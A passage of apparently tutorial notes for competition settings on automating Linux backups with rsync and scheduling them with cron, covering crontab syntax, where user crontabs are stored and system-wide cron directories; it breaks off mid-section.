Let's start automating some basic tasks and their applications to competition environments.

* As an example, let's make a directory, `stuff/`, with 2 files inside: `file1` and `file2`.

* Make a backup directory, `backups/`

### Using rsync

`rsync -av --delete stuff/ backups/`

Quite simply, this has copied the contents of the stuff/ directory into the backups/ directory.

__So... why not just use the `cp` command?__

* The reason: Try modifying a file from the source directory, e.g. `file1`.
    - When you run `rsync -av --delete stuff/ backups/` again, it will copy over only the differences that were made between the source files and the files already inside the `backups/` directory.
    - This is huge, because if we're making huge backups, it means that if we have a previous backup, we don't have to manually rewrite all of it to add a new backup that's not much different than the last one (`cp` would write the entire files regardless of their similarity)

* Rsync can also enforce consistency between source and backup locations.
    - This is the effect of adding `--delete` to our command
    - That is, if you delete a file in stuff/ and you run the rsync command again, it will delete the file in the backups/ folder as well (not the case if you used the `cp` command)
    - __Think carefully about whether you want file removals to reflect for your backups__. The knee-jerk (and long-term bad) solution for a large environment is to not enable it.
    - For competitions, though, we may get away with it without causing too much clutter.


### 35: Cron and cronjobs 🕐

* Is cron installed on your system?: `sudo systemctl status cron` (or `crond`)

As part of the cron program, you get what are called "cron tabs"
    - These are files that include automatic commands

* The question, now, is: How many of these crontabs are there and where are they on our system?
    - One way to see some of these is by running `crontab -e`
    - Take a look at the explanation given in the default crontab file, the comments indicate the syntax and some examples of how to write a cronjob that executes periodically.

* Example: `0 0 * * 0 /home/br/.local/bin/paccache-clear`
    - "Execute the program `/home/br/.local/bin/paccache-clear` on the 0th minute, on the 0th hour, on every day of the month, on every month of the year, on the 0th day of the week"
    - In other words, it runs at 0:00 on every Sunday.

__Easy crontab parser/explainer__: [https://crontab.guru](https://crontab.guru)


### But how do we view all users' crontabs on a machine

By looking in the `/var/spool/cron/crontabs/` directory
    - Note: sometimes the directory may just be set as `/var/spool/cron` (this is the case for me using Arch Linux)
    - Also note: these are not ALL the crontabs, just the user crontabs (more on this later).

* The files in this directory are named according to the user who the crontab is for.
    - e.g. if my username on my machine is `br` then the crontab would be at `/var/spool/cron/crontabs/br` (or possibly at `/var/spool/cron/br`)

* When a new user runs `crontab -e`, a crontab for them gets created as specified above.

Note: Cron does not need a restart after modifying the crontab, but it might be a good idea to just restart it with `sudo systemctl restart cron` just to build the habit.


### cron with rsync for a simple automatic backup

What would a cronjob for the rsync command, `rsync -av /home/sandbox/Desktop/stuff/ /home/sandbox/Desktop/backups/`, look like? (note the absence of the `--delete` option)

A: `* * * * * rsync -av /home/sandbox/Desktop/stuff/ /home/sandbox/Desktop/backups/`


### System-wide conjobs

In the `/etc/` directory, you will probably have:
- `cron.d`: cron example snippets
- `cron.daily`: system-wide daily cronjobs
- `cron.hourly`: s
